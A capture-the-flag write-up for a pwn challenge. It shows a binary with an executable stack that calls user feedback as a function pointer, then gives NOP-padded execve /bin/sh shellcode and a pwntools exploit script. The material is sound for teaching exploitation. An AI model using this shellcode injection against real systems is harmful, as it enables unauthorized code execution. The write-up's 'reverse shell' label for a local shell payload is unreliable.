# Description:
Thank you for joining contest

# Solution

First, use `file` command in Linux is used to determine the type of a file.

>ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f9fe6b3346b0425d130a145cfdd72f8fbc73d18, not stripped

Second, we need to use `checksec` to check various security features of executable files as bellow.

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/06e2d33f-fab3-4e53-b1bb-28301afd7e03)

With security features mostly turned off making this exploit easier.

Let's use `vmmap` to view memory mappings and we can see that stack have full permision rwx.


![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/6a34aca7-df45-47d8-92f4-e242b63144c6)


Use IDA64 to decompile the binary file and we can see 1 function name `getflag()`

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/3b869e3d-f603-4959-a7ec-f02f8349e07e)

This function is a program that prompts the user for their name and feedback an contest. If the length of the feedback is less than or equal to `39 characters`, it displays an error message; otherwise, it prints a thank you message and calls getflag() with the feedback as its argument. 

Let's check in detail

![image](https://github.com/N1GHT-F4LL/CTF/assets/60804710/4db346c1-904b-4cfe-810a-6d6baa6276e2)

The vulnerability in this function is that it does not perform any checks on the given function pointer before calling it. This means an we can provide a malicious function pointer to getflag() and execute arbitrary code. To exploit this, an we could overwrite the providing malicious code as input that can then be executed when the getflag() function returns when they call getflag() and we can `Reverse shell` to find flag.

Remember that we need to have shellcode at least 39 bytes long.

With easy way, we will include a [shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode) in x86-64 architecture. I use [Linux/x86-64 - Execute /bin/sh - 27 bytes](https://shell-storm.org/shellcode/files/shellcode-806.html) and add some [NOP Byte Code](https://en.wikipedia.org/wiki/NOP_(code)) is `0x90` so that it is enough for a minimum of 39 bytes.

With more difficulty, we can find somewhere a shell code longer than 39 bytes without using NOP Bytes.

My ShellCode bellow

> \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05

Then we just need to write code with pwn in python which can send the shellcode to the server and use some Linux Command to looking for flag at server with interactive mode.

``` python
from pwn import *

try:
	p = process('./pwn2')
	#p = remote('139.180.137.100', 1338)
	res = p.recvuntil('Give me your name:')
	p.sendline(b'a')
	shell =b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
	res = p.recvuntil('What do you think about the contest (feedback) ?')
	p.sendline(shell)
	p.interactive()
except Exception as e:
    print("An error occurred:", e)
finally:
    p.close()
```
